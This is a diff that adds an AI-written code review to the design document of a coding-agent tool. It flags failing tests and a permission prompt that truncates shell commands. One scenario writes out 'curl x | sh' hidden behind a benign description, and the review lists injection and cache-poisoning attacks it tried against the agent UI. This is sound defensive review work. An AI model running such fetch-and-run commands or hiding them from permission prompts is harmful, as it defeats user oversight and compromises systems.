@@ -611,4 +611,21 @@ paths: clean.
 
 ## Review
 
-*— (empty)*
+*— claude-opus-5-5, 2026-11-21* (fresh context; SAME model as the planner and as the Context/Implementation author — shared blind spots possible. The executor commits are tagged deepseek.)
+
+**Verdict: REQUEST-CHANGES.**
+
+**Findings (HIGH/MEDIUM only).**
+1. **HIGH — gate red.** `packages/config/test/readme-config-table.test.ts:39` and `:48` FAIL: the README config table was not regenerated for `beta` / `beta.compactShell` (`bun run docs:config` not run, README not in the diff). `bun run check` cannot be green. The Execution's "narrow tests 323 pass" skipped the `packages/config` dir test that covers the new keys.
+2. **MEDIUM — the beta ships without its safety net (S3 not built).** `beta.compactShell`'s accepted cost rests on "the command stays in the permission ask" (`key-docs.ts` `beta.compactShell.details`, `defaults.ts`). On this branch the ask is still today's: the shell command is ONE row, DIM and silently `truncate`d to `columns − 3` (`components/PermissionPrompt.tsx:65-69`, `permission-ui.ts:128-130`). Scenario: compact ON, `{command: "ls -la <long path …> ; curl x | sh", description: "List the project files"}` → the ask shows the dim, cut prefix, the row shows only `● List the project files ✓` — the tail is never on screen unless expanded. Q3 (full colour + wrapped, `… N more lines`) was the approved mitigation. Either land S3 (after the owner rules on the `askedFor` amendment, Design §5 ⚠) before merging, or keep `compactShell` out of this merge. Also `permissionIntent` (`core/src/shell-intent.ts:125`) is exported with no caller, and the doc header still says "ready for Execution".
+3. **MEDIUM — the phone half is not verified by anyone.** `apps/mobile/test/shell-intent-step.test.ts` and `transcript-cell.test.ts` fail to LOAD in this worktree (`Cannot find module '@tentacle/core'` from `apps/mobile/src/tool-steps.ts`: no `apps/mobile/node_modules`). `bun run typecheck` here prints ~10 k env errors (mobile `--jsx`, unresolved modules), so `StepNode.tsx` / `App.tsx` / `SessionScreen.tsx` / `TranscriptRow.tsx` are not type-checked; the executor ran no typecheck either. Run the full gate in an installed tree before merge.
+
+**Gate (this worktree).** `bun run lint`: clean (2212 files). Touched tests: 555 pass / 3 fail / 1 load error over 40 files (2 = finding 1; 1 + the error = finding 3's missing module). `packages/cli` key-docs + carried: 7/0. Typecheck: unusable here (env); no error lands on a touched non-mobile file (`render-lines`, `App`, `run`, `connect`, `main`, `config/src`, `core`, `tools`).
+
+**Mutations (each reverted; `git status` empty afterwards).** Drop the INVISIBLE strip → `bidi … removed` RED. Drop `|| status === "denied"` → `compact … failure/denial` RED. Re-add the running body (`toolBodyRows` while running) → 5 row tests + the ink App test RED. All three non-vacuous.
+
+**Premises spot-checked.** Raw `description` travels daemon → client untouched (Context repro): TRUE per the executor's re-run (not re-run by me). Permission detail one dim truncated row (`PermissionPrompt.tsx:65-69`): TRUE. `fitSubtitle` flattens newlines/tabs and returns `""` at budget ≤ 0 (`tool-expand.ts:106-113`): TRUE — the `$` row's command handling is no weaker than today's subtitle.
+
+**Attacks tried.** (a) Control/ANSI/bidi in `description` → stripped in core before either client (holds; pinned). (b) Cache poisoning compact vs non-compact → `compactShell` in the `itemRows` key + all four App opts sites and both deps lists (holds). (c) Pod-supplied sentence feeding a decision → no permission/approval code reads it; `packages/client` untouched, so the never-from-the-wire attribution invariant (`foreign-turns.test.ts:775-777`) is intact (holds). (d) Silent drop of `beta` through resolve/profile/load → fixed by the drift edits, tested (holds). (e) Compact + truncated ask → finding 2.
+
+**Executor behaviour.** Correctly STOPPED S3 when the plan collided with a pinned invariant and wrote the amendment instead of forcing it; mutation table honest. But it reported done-ish with the gate unrun (README test, typecheck), and the mobile tests never executed.
